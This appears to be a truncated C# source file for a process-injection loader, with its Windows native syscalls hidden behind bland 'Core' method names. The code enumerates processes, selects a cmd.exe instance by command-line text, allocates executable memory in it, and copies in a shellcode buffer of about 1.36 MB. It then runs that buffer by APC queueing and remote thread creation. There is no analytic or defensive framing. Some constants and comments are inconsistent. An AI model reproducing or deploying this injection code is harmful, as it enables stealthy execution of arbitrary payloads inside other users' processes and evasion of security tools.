using System;

namespace CoreEngine
{

public class Code
{

    public static void DllMain()
    {
          CoreVersion( ref osVersionInfo );
          IntPtr ProcessHandle = IntPtr.Zero;
          IntPtr NewThreadHandle = IntPtr.Zero;
          ulong Flags = 0;
          for (int i = 0; i <= 1000; i++ ) // make sure we don't loop forever
          {
              // ZwGetNextProcess
              CoreNext( ProcessHandle, 267386880+1048576 /*0x10000000 ACCESS_MASK.GENERIC_ALL*/, CORE_Flags.None, Flags, out ProcessHandle );
              try
              {
                    CORE_BASIS PBI = new CORE_BASIS();
                    int ReturnLength = 0;
                    // ZwQueryInformationProcess
                    CoreQuery( ProcessHandle, CORE_INFORMATION_CLASS.ProcessBasicInformation, out PBI, System.Runtime.InteropServices.Marshal.SizeOf( PBI ), out ReturnLength );
                    long PEBaddress = PBI.PebBaseAddress.ToInt64();
                    IntPtr PtrToStructure = new IntPtr();
                    UInt32 NumberOfBytesRead = 0;
                    UInt32 NumberOfBytesToRead = (UInt32)System.Runtime.InteropServices.Marshal.SizeOf( PtrToStructure );
                    // ZwReadVirtualMemory
                    CoreRead( ProcessHandle, new IntPtr(PEBaddress + 0x20), out PtrToStructure, NumberOfBytesToRead, ref NumberOfBytesRead );
                    UNICODE_STRING UnicodeStringCommandLine = new UNICODE_STRING();
                    // ZwReadVirtualMemory
                    CoreReadA( ProcessHandle, new IntPtr((long)PtrToStructure + 0x70), out UnicodeStringCommandLine, new IntPtr(System.Runtime.InteropServices.Marshal.SizeOf(UnicodeStringCommandLine)), IntPtr.Zero );
                    string StringCommandLine = new string('\0', UnicodeStringCommandLine.Length / 2);
                    // ZwReadVirtualMemory
                    CoreReadB( ProcessHandle, (IntPtr)UnicodeStringCommandLine.Buffer, StringCommandLine, new IntPtr(UnicodeStringCommandLine.Length), IntPtr.Zero );
                    if (StringCommandLine.Contains("cmd.exe") & StringCommandLine.Contains("coffee") & StringCommandLine.Contains(""))
                    {
                        // ZwGetNextThread
                        CoreNextT( ProcessHandle, NewThreadHandle, 267386880+1048576 /*ACCESS_MASK.GENERIC_ALL*/, 0, 0, out NewThreadHandle );
                        break;
                    }
              }
              catch (Exception e)
              {
                  Console.WriteLine( "ERROR status: {0}", e.Message );
              }
          }
          IntPtr MemoryAllocation = new IntPtr();
          IntPtr scodeSize = (IntPtr)(Int32)1357745;
          // ZwAllocateVirtualMemory
          CoreAllocate( "ERROR", ProcessHandle, ref MemoryAllocation, new IntPtr(0), ref scodeSize, 0x1000 /*MEM_COMMIT*/ | 0x2000 /*MEM_RESERVE*/, 0x10 /*PROCESS_VM_READ*/ );
          UInt32 BytesWritten = 0;
          // ZwProtectVirtualMemory
          CoreProtect( "ERROR", ProcessHandle, ref MemoryAllocation, ref scodeSize, 60+4 /*PAGE_EXECUTE_READWRITE*/, ref BytesWritten );
          IntPtr byteWritten = IntPtr.Zero;
          IntPtr unmanagedPointer = System.Runtime.InteropServices.Marshal.AllocHGlobal(1357745);
          System.Runtime.InteropServices.Marshal.Copy( CoreFind(), 0, unmanagedPointer, 1357745);
          // ZwWriteVirtualMemory
          CoreVirtual( "ERROR", ProcessHandle, ref MemoryAllocation, unmanagedPointer, (UInt32)1357745, ref byteWritten );
          System.Runtime.InteropServices.Marshal.FreeHGlobal(unmanagedPointer);
          // ZwQueueApcThread
          CoreQueue( "ERROR", NewThreadHandle, MemoryAllocation );
          IntPtr RemoteThread = IntPtr.Zero;
          // ZwCreateThreadEx
          CoreThreadEx( "ERROR", out RemoteThread, (uint)1847151+250000, IntPtr.Zero, ProcessHandle, MemoryAllocation, IntPtr.Zero, 0, 0, 0, 0, IntPtr.Zero );
          // ZwClose
          CoreClose( "ERROR", ProcessHandle );
          CoreClose( "ERROR", NewThreadHandle );
    }


